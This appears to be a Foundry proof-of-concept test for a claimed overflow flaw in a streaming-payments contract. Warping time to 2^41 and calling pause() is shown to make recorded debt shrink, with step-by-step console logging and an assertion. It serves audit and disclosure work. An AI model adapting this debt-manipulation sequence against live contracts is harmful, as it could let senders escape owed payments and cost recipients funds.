// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.22;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ud21x18, UD21x18 } from "@prb/math/src/UD21x18.sol";
import { console2 } from "forge-std/src/console2.sol";

import { Integration_Test } from "../../Integration.t.sol";

/// @title ManualVerification_POC
/// @notice Detailed manual verification of the pause() debt manipulation vulnerability
/// @dev This test provides step-by-step output to understand the overflow mechanism
contract ManualVerification_POC is Integration_Test {
    uint256 internal streamId;

    function setUp() public override {
        Integration_Test.setUp();
    }

    /// @notice Detailed demonstration with console output showing the overflow
    function test_ManualVerification_DetailedOverflow() public {
        console2.log("=== MANUAL VERIFICATION: Pause Debt Manipulation Vulnerability ===");
        console2.log("");

        // Step 1: Create stream with high rate
        UD21x18 highRate = ud21x18(1e15); // 1e15 = 1 quadrillion tokens/second (in scaled units)
        console2.log("Step 1: Creating stream with high rate");
        console2.log("  Rate per second (scaled):", highRate.unwrap());
        console2.log("  Rate per second (human): 1e15 scaled units");
        
        streamId = flow.create({
            sender: users.sender,
            recipient: users.recipient,
            ratePerSecond: highRate,
            startTime: 0, // Start immediately
            token: usdc,
            transferable: true
        });
        console2.log("  Stream ID:", streamId);
        console2.log("  Initial snapshotTime:", flow.getSnapshotTime(streamId));
        console2.log("  Initial snapshotDebtScaled:", flow.getSnapshotDebtScaled(streamId));
        console2.log("");

        // Step 2: Deposit minimal amount
        uint128 depositAmount = 1e6; // 1 USDC (6 decimals)
        deal({ token: address(usdc), to: users.sender, give: depositAmount });
        usdc.approve(address(flow), depositAmount);
        flow.deposit(streamId, depositAmount, users.sender, users.recipient);
        console2.log("Step 2: Deposited funds");
        console2.log("  Deposit amount:", depositAmount);
        console2.log("  Stream balance:", flow.getBalance(streamId));
        console2.log("");

        // Step 3: Check initial state
        uint256 initialDebt = flow.totalDebtOf(streamId);
        console2.log("Step 3: Initial state (at creation time)");
        console2.log("  Block timestamp:", block.timestamp);
        console2.log("  Total debt:", initialDebt);
        console2.log("  Snapshot debt scaled:", flow.getSnapshotDebtScaled(streamId));
        console2.log("  Ongoing debt scaled:", _calculateOngoingDebtScaled(streamId));
        console2.log("");

        // Step 4: Warp to extreme timestamp (2^41 as in Certora counterexample)
        uint256 extremeTimestamp = 2 ** 41; // 2,199,023,255,552 seconds
        console2.log("Step 4: Warping to extreme timestamp");
        console2.log("  Extreme timestamp:", extremeTimestamp);
        console2.log("  This is approximately:", extremeTimestamp / 365 days, "years from epoch");
        vm.warp(extremeTimestamp);
        console2.log("  Current block timestamp:", block.timestamp);
        console2.log("");

        // Step 5: Calculate what the ongoing debt should be
        uint256 snapshotTime = flow.getSnapshotTime(streamId);
        uint256 elapsedTime = block.timestamp - snapshotTime;
        uint256 ratePerSecond = flow.getRatePerSecond(streamId).unwrap();
        uint256 ongoingDebtScaled = elapsedTime * ratePerSecond;
        
        console2.log("Step 5: Calculating ongoing debt before pause");
        console2.log("  Snapshot time:", snapshotTime);
        console2.log("  Current time:", block.timestamp);
        console2.log("  Elapsed time (seconds):", elapsedTime);
        console2.log("  Rate per second (scaled):", ratePerSecond);
        console2.log("  Ongoing debt scaled = elapsedTime * ratePerSecond");
        console2.log("  Ongoing debt scaled =", elapsedTime, "*", ratePerSecond);
        
        // Check for overflow
        uint256 maxUint256 = type(uint256).max;
        console2.log("  Max uint256:", maxUint256);
        console2.log("  Product:", ongoingDebtScaled);
        
        if (ongoingDebtScaled < elapsedTime || ongoingDebtScaled < ratePerSecond) {
            console2.log("  *** OVERFLOW DETECTED: Product wrapped around! ***");
        }
        console2.log("");

        // Step 6: Check debt before pause
        uint256 debtBeforePause = flow.totalDebtOf(streamId);
        uint256 snapshotDebtBefore = flow.getSnapshotDebtScaled(streamId);
        console2.log("Step 6: State BEFORE pause()");
        console2.log("  Snapshot debt scaled:", snapshotDebtBefore);
        console2.log("  Ongoing debt scaled:", _calculateOngoingDebtScaled(streamId));
        console2.log("  Total debt (descaled):", debtBeforePause);
        console2.log("");

        // Step 7: Execute pause
        console2.log("Step 7: Executing pause()");
        console2.log("  This calls _adjustRatePerSecond(streamId, 0)");
        console2.log("  Which does: snapshotDebtScaled += ongoingDebtScaled");
        flow.pause(streamId);
        console2.log("  Pause completed");
        console2.log("");

        // Step 8: Check debt after pause
        uint256 debtAfterPause = flow.totalDebtOf(streamId);
        uint256 snapshotDebtAfter = flow.getSnapshotDebtScaled(streamId);
        console2.log("Step 8: State AFTER pause()");
        console2.log("  Snapshot debt scaled:", snapshotDebtAfter);
        console2.log("  Ongoing debt scaled:", _calculateOngoingDebtScaled(streamId));
        console2.log("  Total debt (descaled):", debtAfterPause);
        console2.log("");

        // Step 9: Calculate the loss
        console2.log("Step 9: Vulnerability Analysis");
        console2.log("  Debt before pause:", debtBeforePause);
        console2.log("  Debt after pause:", debtAfterPause);
        console2.log("  Debt lost:", debtBeforePause - debtAfterPause);
        
        if (debtAfterPause < debtBeforePause) {
            console2.log("  *** VULNERABILITY CONFIRMED: Debt decreased! ***");
            console2.log("  Percentage lost:", (debtBeforePause - debtAfterPause) * 100 / debtBeforePause, "%");
        }
        console2.log("");

        // Verify the vulnerability
        assertGe(debtAfterPause, debtBeforePause, "VULNERABILITY: Debt decreased after pause!");
    }

    /// @notice Show the exact overflow calculation
    function test_ManualVerification_OverflowCalculation() public {
        console2.log("=== OVERFLOW CALCULATION ANALYSIS ===");
        console2.log("");

        // Create stream
        UD21x18 rate = ud21x18(1e15);
        streamId = flow.create({
            sender: users.sender,
            recipient: users.recipient,
            ratePerSecond: rate,
            startTime: 0,
            token: usdc,
            transferable: true
        });

        // Deposit
        uint128 depositAmount = 1e6;
        deal({ token: address(usdc), to: users.sender, give: depositAmount });
        usdc.approve(address(flow), depositAmount);
        flow.deposit(streamId, depositAmount, users.sender, users.recipient);

        // Warp to 2^41
        uint256 extremeTimestamp = 2 ** 41;
        vm.warp(extremeTimestamp);

        // Get values
        uint256 snapshotTime = flow.getSnapshotTime(streamId);
        uint256 currentTime = block.timestamp;
        uint256 elapsedTime = currentTime - snapshotTime;
        uint256 ratePerSecond = flow.getRatePerSecond(streamId).unwrap();

        console2.log("Values:");
        console2.log("  snapshotTime:", snapshotTime);
        console2.log("  currentTime:", currentTime);
        console2.log("  elapsedTime:", elapsedTime);
        console2.log("  ratePerSecond:", ratePerSecond);
        console2.log("");

        // Calculate ongoing debt
        uint256 ongoingDebtScaled = elapsedTime * ratePerSecond;
        console2.log("Calculation: ongoingDebtScaled = elapsedTime * ratePerSecond");
        console2.log("  ongoingDebtScaled =", elapsedTime, "*", ratePerSecond);
        console2.log("  Result:", ongoingDebtScaled);
        console2.log("");

        // Check if this would overflow when added to snapshotDebtScaled
        uint256 snapshotDebtScaled = flow.getSnapshotDebtScaled(streamId);
        console2.log("Before pause:");
        console2.log("  snapshotDebtScaled:", snapshotDebtScaled);
        console2.log("  ongoingDebtScaled:", ongoingDebtScaled);
        console2.log("");

        // Simulate the addition
        uint256 newSnapshotDebtScaled = snapshotDebtScaled + ongoingDebtScaled;
        console2.log("During pause (in _adjustRatePerSecond):");
        console2.log("  newSnapshotDebtScaled = snapshotDebtScaled + ongoingDebtScaled");
        console2.log("  newSnapshotDebtScaled =", snapshotDebtScaled, "+", ongoingDebtScaled);
        console2.log("  Result:", newSnapshotDebtScaled);
        console2.log("");

        // Check for overflow
        if (newSnapshotDebtScaled < snapshotDebtScaled) {
            console2.log("  *** OVERFLOW: Addition wrapped around! ***");
            console2.log("  This is why the debt becomes 0 or near-zero");
        }

        // Now actually pause and see what happens
        flow.pause(streamId);
        uint256 actualSnapshotDebtAfter = flow.getSnapshotDebtScaled(streamId);
        console2.log("After pause:");
        console2.log("  Actual snapshotDebtScaled stored:", actualSnapshotDebtAfter);
        console2.log("  Expected (if no overflow):", newSnapshotDebtScaled);
        console2.log("");

        if (actualSnapshotDebtAfter != newSnapshotDebtScaled) {
            console2.log("  *** MISMATCH: Overflow occurred during storage! ***");
        }
    }

    /// @notice Helper to calculate ongoing debt scaled (replicates internal logic)
    function _calculateOngoingDebtScaled(uint256 streamId_) internal view returns (uint256) {
        uint256 blockTimestamp = block.timestamp;
        uint256 snapshotTime = flow.getSnapshotTime(streamId_);

        if (snapshotTime >= blockTimestamp) {
            return 0;
        }

        uint256 ratePerSecond = flow.getRatePerSecond(streamId_).unwrap();

        if (ratePerSecond == 0) {
            return 0;
        }

        uint256 elapsedTime;
        unchecked {
            elapsedTime = blockTimestamp - snapshotTime;
        }

        return elapsedTime * ratePerSecond;
    }
}
